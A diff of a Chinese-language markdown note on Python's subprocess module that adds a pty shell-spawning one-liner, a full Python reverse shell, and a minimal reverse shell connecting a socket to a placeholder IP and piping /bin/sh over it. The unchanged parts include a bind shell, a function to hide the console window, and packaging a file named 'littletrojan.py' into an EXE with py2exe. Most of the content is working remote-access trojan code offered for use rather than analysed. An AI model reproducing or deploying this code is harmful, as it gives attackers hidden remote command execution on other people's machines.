@@ -2,6 +2,14 @@
 
 这是一个函数执行的库，类似与 os.system , os.popen , commands 等命令执行的语句或库。
 
+执行 shell 命令的还有 pty
+
+一句话起 shell
+
+```
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
 这个库中就只有一个类 Popen
 
 ```
@@ -65,7 +73,7 @@ def check_output(*popenargs, **kwargs):
     return output
 ```
 
-一个简单的的 shell 
+一个简单的的 shell
 
 ```python
 # coding=utf-8
@@ -88,14 +96,14 @@ if __name__ == '__main__':
 		if command == "exit" or command == "quit":
 			break
 		result = run_command(command)
-		
+
 		print result,
 ```
 
-一个反弹 shell 
+一个 shell
 
 ```
-# coding=utf-8
+# -*- coding: utf-8 -*-
 
 import sys
 import socket
@@ -103,24 +111,26 @@ import argparse
 import threading
 import subprocess
 
+
 class TargetServer(object):
 
     def __init__(self, port):
         self.port = port
         self.host = socket.gethostname()
-        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-        self.server.bind(("0.0.0.0",int(self.port)))
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind(("0.0.0.0", int(self.port)))
         self.server.listen(10)
 
     def run(self):
         while 1:
-            client_socket,client_addr = self.server.accept()
-            client_thread = threading.Thread(target=self.client_handler,args=(client_socket,))
+            client_socket, client_addr = self.server.accept()
+            client_thread = threading.Thread(target=self.client_handler,
+                                             args=(client_socket,))
             client_thread.start()
 
-    def client_handler(self,client_socket):
-        client_socket.sendall("<@ %s \$ >"%self.host)
+    def client_handler(self, client_socket):
+        client_socket.sendall("<@ %s $ >" % self.host)
         while 1:
             try:
                 cmd_buffer = client_socket.recv(1024)
@@ -128,18 +138,20 @@ class TargetServer(object):
                 if len(response) == 0:
                     response = "[Successful!]\n"
                 client_socket.sendall(response)
-            except Exception,e:
+            except Exception, e:
                 # print e
                 break
 
-    def run_command(self,command):
+    def run_command(self, command):
         command = command.strip()
         try:
-            output = subprocess.check_output(command , stderr=subprocess.STDOUT , shell=True)
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT,
+                                             shell=True)
         except:
             output = '[*]Failed to execute command ! \n'
 
         return output
+
 
 class Client(object):
 
@@ -147,11 +159,11 @@ class Client(object):
         self.host = host
         self.port = port
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-        
+        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
     def run(self):
         try:
-            self.client.connect((self.host,int(self.port)))
+            self.client.connect((self.host, int(self.port)))
             header = self.client.recv(4096)
             command = raw_input(header)
             if command == "exit" or command == "quit":
@@ -162,7 +174,7 @@ class Client(object):
                 recv_len = 1
                 response = ""
 
-                while recv_len :
+                while recv_len:
                     data = self.client.recv(4096)
                     recv_len = len(data)
                     response += data
@@ -180,21 +192,26 @@ class Client(object):
         except:
             print "[*] Exception Failed ! \n"
 
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="NetCat Shell")
-    parser.add_argument("-s","--server",help="Target Server",action="store_true")
-    parser.add_argument("-c","--client",help="Client",action="store_true")
-    parser.add_argument("--host",help="target host IP",action="store",default="127.0.0.1")
-    parser.add_argument("port",help="target host port",action="store",type=int)
+    parser.add_argument("-s", "--server", help="Target Server",
+                        action="store_true")
+    parser.add_argument("-c", "--client", help="Client", action="store_true")
+    parser.add_argument("--host", help="target host IP", action="store",
+                        default="127.0.0.1")
+    parser.add_argument("port", help="target host port", action="store",
+                        type=int)
     args = parser.parse_args()
     port = args.port
-    if args.server: 
+    if args.server:
         s = TargetServer(port)
         s.run()
     if args.client:
         host = args.host
-        c = Client(host,port)
+        c = Client(host, port)
         c.run()
+
 ```
 
 在服务器运行时，希望它隐藏 console 窗体，如果在 cmd 中执行则不会隐藏
@@ -209,17 +226,160 @@ def hiding():
       ctypes.windll.kernel32.CloseHandle(whnd)
 ```
 
+反向 shell
+
+```
+# -*- coding: utf-8 -*-
+
+import sys
+import socket
+import argparse
+import threading
+import subprocess
+
+
+class TargetServer(object):
+
+    def __init__(self, port):
+        self.port = port
+        self.host = socket.gethostname()
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind(("0.0.0.0", int(self.port)))
+        self.server.listen(10)
+
+    def run(self):
+        while 1:
+            client_socket, client_addr = self.server.accept()
+            client_thread = threading.Thread(target=self.client_handler,
+                                             args=(client_socket,))
+            client_thread.start()
+
+    def client_handler(self, client_socket):
+        try:
+            header = client_socket.recv(4096)
+            command = raw_input(header)
+            if command == "exit" or command == "quit":
+                client_socket.close()
+                sys.exit(0)
+            client_socket.sendall(command)
+            while 1:
+                recv_len = 1
+                response = ""
+
+                while recv_len:
+                    data = client_socket.recv(4096)
+                    recv_len = len(data)
+                    response += data
+                    if recv_len < 4096:
+                        break
+
+                print response,
+
+                command = raw_input(header)
+                if command == "exit" or command == "quit":
+                    client_socket.close()
+                    sys.exit(0)
+                client_socket.sendall(command)
+        except:
+            print "[*] Exception Failed ! \n"
+
+
+class Client(object):
+
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    def client_handler(self):
+        self.client.sendall("<@ %s $ >" % self.host)
+        while 1:
+            try:
+                cmd_buffer = self.client.recv(1024)
+                response = self.run_command(cmd_buffer)
+                if len(response) == 0:
+                    response = "[Successful!]\n"
+                self.client.sendall(response)
+            except Exception as e:
+                print tuple(e)
+
+    def run_command(self, command):
+        command = command.strip()
+        try:
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT,
+                                             shell=True)
+        except:
+            output = '[*]Failed to execute command ! \n'
+
+        return output
+
+    def run(self):
+        try:
+            self.client.connect((self.host, int(self.port)))
+            self.client.sendall("<@ %s $ >" % self.host)
+
+            while 1:
+                recv_len = 1
+
+                while recv_len:
+                    cmd_buffer = self.client.recv(1024)
+                    response = self.run_command(cmd_buffer)
+                    if len(response) == 0:
+                        response = "[Successful!]\n"
+                    self.client.sendall(response)
+
+        except:
+            print "[*] Exception Failed ! \n"
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="NetCat Shell")
+    parser.add_argument("-s", "--server", help="Target Server",
+                        action="store_true")
+    parser.add_argument("-c", "--client", help="Client", action="store_true")
+    parser.add_argument("--host", help="target host IP", action="store",
+                        default="127.0.0.1")
+    parser.add_argument("port", help="target host port", action="store",
+                        type=int)
+    args = parser.parse_args()
+    port = args.port
+    if args.server:
+        s = TargetServer(port)
+        s.run()
+    if args.client:
+        host = args.host
+        c = Client(host, port)
+        c.run()
+
+```
+
+
+最简单的反向 shell
+
+```
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<ip>", port));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+```
+
 用 py2exe 打包成 EXE 文件
 
 ```
 #setup.py
 from distutils.core import setup
 import py2exe
- 
+
 setup(console=["littletrojan.py"])#此处为需要封装的python文件名
 ```
 
-然后 
+然后
 
 ```
 python setup.py py2exe
